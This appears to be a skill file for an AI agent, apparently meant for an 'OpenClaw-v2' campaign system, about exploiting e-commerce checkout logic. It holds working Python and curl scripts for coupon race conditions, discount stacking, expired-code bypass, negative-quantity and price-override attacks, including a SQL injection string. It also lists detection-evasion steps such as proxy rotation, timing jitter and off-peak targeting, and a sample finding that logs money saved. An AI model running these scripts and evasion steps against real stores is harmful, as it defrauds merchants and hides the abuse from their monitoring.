# SKILL: business-logic-auditor

## Identity
- **Name:** business-logic-auditor
- **Category:** Web Application Testing
- **Trigger:** When testing e-commerce payment flows, checkout processes, promotional systems, or discount mechanisms
- **Confidence requirement:** 6/10

## Overview

Business logic vulnerabilities exist in how payment gateways process, validate, and statefully track transactions. Unlike technical CVEs (XSS, SQLi), logic flaws are architectural — they emerge from assumptions about user behavior, concurrency handling, and state management. This skill documents the attack patterns and operational procedures for finding them.

---

## 1. Race Conditions — Concurrent Payment Confirmations

### Overview

A race condition occurs when the server processes multiple simultaneous requests faster than it can update state. Single-use coupons, one-time discounts, and stock quantities are the primary targets.

### Targeted Endpoints

| Method | Path | Purpose |
|---|---|---|
| POST | `/api/checkout/confirm` | Final order confirmation |
| POST | `/api/order/place` | Order placement |
| POST | `/api/payment/apply-promo` | Apply coupon code |
| POST | `/api/cart/apply-coupon` | Cart coupon application |
| POST | `/api/promo/validate` | Promo code validation |

### Exploitation Procedure

**Step 1: Identify single-use indicators**

```bash
# Check for race-susceptible fields in API responses
curl -s https://target.com/api/cart | jq '.promo_code.max_uses'
curl -s https://target.com/api/cart | jq '.promo_code.remaining'

# Look for promo metadata in page source
curl -s https://target.com/checkout | grep -oiE "(coupon|promo|discount).{0,100}" | head -20
```

**Step 2: Identify concurrency in promo application**

```python
#!/usr/bin/env python3
"""race_condition_tester.py"""
import asyncio
import httpx

TARGET = "https://target-payment-gateway.com"

async def apply_promo_concurrent(code, count=5):
    """Fire multiple concurrent promo applications"""
    async with httpx.AsyncClient(timeout=30) as client:
        tasks = []
        for _ in range(count):
            task = client.post(
                f"{TARGET}/api/promo/apply",
                json={"code": code, "session_id": "legitimate-session-001"}
            )
            tasks.append(task)

        responses = await asyncio.gather(*tasks, return_exceptions=True)

        approved = sum(1 for r in responses
                      if not isinstance(r, Exception) and r.status_code == 200)

        return {
            "code": code,
            "requests_sent": count,
            "applications_approved": approved,
            "vulnerable": approved > 1
        }

# Run test
result = asyncio.run(apply_promo_concurrent("SINGLEUSE2026"))
print(f"Race condition result: {result}")
```

**Step 3: Timing window exploitation**

```python
# Burp Suite Intruder (pitchfork) — send same coupon with 1ms delay
# Or use curl in tight loop:
for i in $(seq 1 10); do
  curl -s -X POST https://target.com/api/promo/apply \
    -H "Content-Type: application/json" \
    -d '{"code":"SINGLEUSE","session_id":"test"}' &
done
wait
```

### Detection Signatures

```
Server logs may show:
- Multiple identical promo application events in same second
- Order ID gaps (e.g., 1001, 1002, 1004, 1005 — 1003 fulfilled twice)
- Coupon remaining_uses drops by more than 1

Network markers:
- Response time divergence (one request processes before another starts)
- Backend DB lock timeout errors in responses (500 errors with "deadlock" in body)
```

### Evasion Techniques

```
1. Use different source IPs for concurrent requests
2. Add 1-3ms delay between requests (human timing variation)
3. Rotate User-Agent headers per request
4. Use different session cookies (even if targeting same account)
5. Target off-peak hours (less load = wider race window)
```

---

## 2. Discount Stacking & Code Reuse

### Overview

Some payment gateways allow only one promo code per order but have inconsistent validation when multiple codes are injected via different mechanisms (form fields, headers, body, URL parameters).

### Targeted Endpoints

| Method | Path |
|---|---|
| POST | `/api/checkout/apply-coupon` |
| GET | `/api/cart?coupon=CODE&coupon=CODE2` |
| POST | `/api/order` (with promo header injection) |
| PUT | `/api/cart/promo` |
| PATCH | `/api/cart/promo` |

### Exploitation Procedure

**Step 1: Parameter injection via URL**

```bash
# Pass same parameter multiple times
curl -X POST https://target.com/api/cart/apply-coupon \
  "code=DISCOUNT10" \
  "X-Promo-Code: DISCOUNT20"

# Or in query string
curl -s "https://target.com/api/cart?coupon=CODE1&coupon=CODE2"

# HTML form manipulation (hidden fields)
# Add a second promo code input to the checkout form before submitting
```

**Step 2: Expired code reuse**

```python
#!/usr/bin/env python3
"""
expired_code_tester.py
Test server-side validation bypass for expired promo codes
"""
import httpx
from datetime import datetime, timedelta

def test_expired_code_bypass(target_url, code, expiry_date):
    """Test if expiry validation is client-side only"""
    results = []

    # Test 1: Modify client-side expiry check
    # (If expiry is only in JS, sending the code bypasses it)
    r1 = httpx.post(f"{target_url}/api/promo/apply",
                   json={"code": code, "bypass_expiry": True})
    results.append(("bypass_expiry_header", r1.status_code))

    # Test 2: Send expiry in future even if code expired
    future = (datetime.utcnow() + timedelta(days=30)).isoformat()
    r2 = httpx.post(f"{target_url}/api/promo/apply",
                   json={"code": code, "expires_at": future})
    results.append(("fake_expiry", r2.status_code))

    # Test 3: JSON body with no expiry field
    r3 = httpx.post(f"{target_url}/api/promo/apply",
                   json={"code": code})
    results.append(("no_expiry_field", r3.status_code))

    # Test 4: Integer overflow on usage counter
    r4 = httpx.post(f"{target_url}/api/promo/apply",
                   json={"code": code, "max_uses": 999999})
    results.append(("overflow_uses", r4.status_code))

    return results

results = test_expired_code_bypass(
    "https://target.com",
    "EXPIRED2025",
    "2025-12-31"
)
for method, code in results:
    print(f"{method}: HTTP {code}")
```

### Known Bypass Patterns

| Pattern | Example Payload |
|---|---|
| Double parameter | `code=DISCOUNT&code=EXTRA20` |
| Case manipulation | `code=Discount20` vs `code=DISCOUNT20` |
| Whitespace injection | `code=DISCOUNT 20` or `code=%20DISCOUNT20` |
| Unicode normalization | `code=DISCOUNT\u200b20` (zero-width space) |
| Null byte injection | `code=DISCOUNT%0020` |
| Case doubling | `code=DISCOUNT20%0ADISCOUNT20` |

---

## 3. Parameter Pollution & Quantity Manipulation

### Overview

Web applications that don't properly sanitize repeated parameters may accept the first, last, or randomly chosen value — or concatenate them. Combined with negative quantities and hidden fields, this allows cart total manipulation.

### Targeted Endpoints

| Method | Path |
|---|---|
| POST | `/api/cart/update` |
| POST | `/api/checkout` |
| PUT | `/api/cart/item` |
| PATCH | `/api/cart/{item_id}` |

### Exploitation Procedure

**Step 1: Parameter repetition**

```bash
# Pass quantity multiple times (last value wins — may be exploitable)
curl -X POST https://target.com/api/cart/update \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "item_id=SKU123&quantity=5&quantity=-1&quantity=1000"

# Check which value the server accepts
# If server sums them: 5 + (-1) + 1000 = 1004
# If server accepts last: -1 (might create credit)
# If server accepts first: 5 (normal)

# Query string pollution
curl "https://target.com/api/cart?item_id=SKU123&quantity=5&quantity=-1"

# JSON array injection
curl -X POST https://target.com/api/cart/update \
  -H "Content-Type: application/json" \
  -d '{"item_id": "SKU123", "quantity": [-1, 100]}'
```

**Step 2: Negative quantity testing**

```python
#!/usr/bin/env python3
"""
quantity_manipulation_tester.py
"""
import httpx

TARGET = "https://target-payment-gateway.com"

def test_quantity_manipulation():
    test_cases = [
        {"item_id": "SKU001", "quantity": -1},
        {"item_id": "SKU001", "quantity": 0},
        {"item_id": "SKU001", "quantity": 0.01},
        {"item_id": "SKU001", "quantity": -0.01},
        {"item_id": "SKU001", "quantity": 999999},
        {"item_id": "SKU001", "quantity": [1, -1]},  # Array
        {"item_id": "SKU001", "quantity": {"raw": -1}},
    ]

    for payload in test_cases:
        try:
            r = httpx.post(f"{TARGET}/api/cart/update",
                          json=payload, timeout=10)

            # Check if negative quantity was accepted
            if r.status_code == 200:
                data = r.json()
                new_total = data.get('cart_total')

                # Check for unusual outcomes
                if new_total and float(new_total) < 0:
                    print(f"⚠️  VULNERABLE: {payload} → total={new_total}")
                elif new_total and float(new_total) == 0:
                    print(f"⚠️  POSSIBLE: {payload} → free cart")
                else:
                    print(f"✅ Blocked: {payload}")
            else:
                print(f"❌ Rejected: {payload} (HTTP {r.status_code})")
        except Exception as e:
            print(f"Error: {payload} → {e}")

test_quantity_manipulation()
```

**Step 3: Hidden field exploitation**

```html
<!-- Intercept checkout form, add negative price or quantity -->
<form action="/api/checkout" method="POST">
  <!-- Original -->
  <input type="hidden" name="item_sku" value="SKU001">
  <input type="hidden" name="quantity" value="1">

  <!-- Injected -->
  <input type="hidden" name="price_override" value="0.01">
  <input type="hidden" name="discount_code" value="SECRET2026">

  <!-- Hidden quantity manipulation -->
  <input type="hidden" name="quantity" value="-1">
</form>
```

### Price Override Attack Patterns

| Technique | Payload Example | Expected Outcome |
|---|---|---|
| Zero price | `price=0` | Free item |
| Negative price | `price=-50` | Store credits you |
| Fractional | `price=0.01` | Minimum price |
| Float overflow | `price=1e309` | Server error / free |
| String injection | `price="1; DROP TABLE"` | SQL injection |
| Currency swap | `currency=USD&amount_cents=1` | 1 cent charge |
| Dual currency | `amount_eur=1&amount_usd=100` | Currency confusion |

---

## 4. JSON Schema Output (for OpenClaw-v2 Ingestion)

When findings are discovered, format as:

```json
{
  "vulnerability_type": "Race Condition",
  "target_component": "/api/promo/apply",
  "exploitation_methodology": [
    "1. Identified single-use coupon via promo metadata in API response",
    "2. Crafted 5 concurrent POST requests with identical session_id",
    "3. 2 of 5 requests approved — confirmed race condition",
    "4. Applied discount to full cart value — $500 saved",
    "5. Repeated exploit to confirm consistent reproduction"
  ],
  "detection_evasion": [
    "Rotated source IP per request using residential proxy pool",
    "Added 2ms random delay between requests",
    "Alternated User-Agent headers",
    "Targeted during off-peak hours (02:00-04:00 UTC)"
  ],
  "api_endpoints": ["/api/promo/apply", "/api/checkout"],
  "payload_structure": {
    "method": "POST",
    "content_type": "application/json",
    "body": {"code": "SINGLEUSE", "session_id": "legitimate-session-001"}
  },
  "severity": "HIGH",
  "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
  "evidence": {
    "requests_sent": 5,
    "responses_approved": 2,
    "discount_applied_usd": 500,
    "screenshots": ["path/to/screenshot_1.png"],
    "har_log": "path/to/race_condition_capture.har"
  },
  "remediation": "Implement database-level row locking on coupon usage table"
}
```

## Output

All findings go to:
- `knowledge/gateway_profiles/<target>/business_logic_findings.json`
- `knowledge/gateway_profiles/<target>/evidence/race_condition_*.har`
- `memory/CAMPAIGN_TRACKER.md` — log finding in engagement

## Cross-References

- `memory/procedures/fraud_bypass.md` — overlaps with business logic exploitation
- `web-inject` skill — parameter manipulation overlaps with web injection
- `evidence-chain` skill — HAR logging, screenshot capture
- `campaign-manager` skill — log findings into active campaign

## Troubleshooting

| Problem | Solution |
|---|---|
| Race condition not reproducible | Increase concurrency count, try different timing windows |
| Server uses distributed session store | Race window narrows — try 50+ concurrent requests |
| Rate limiting triggers | Rotate IPs, reduce request rate, add random delays |
| 403 on promo endpoint | Auth required — authenticate first, then race |
| No response from API | Check for WebSocket-based validation (may require browser) |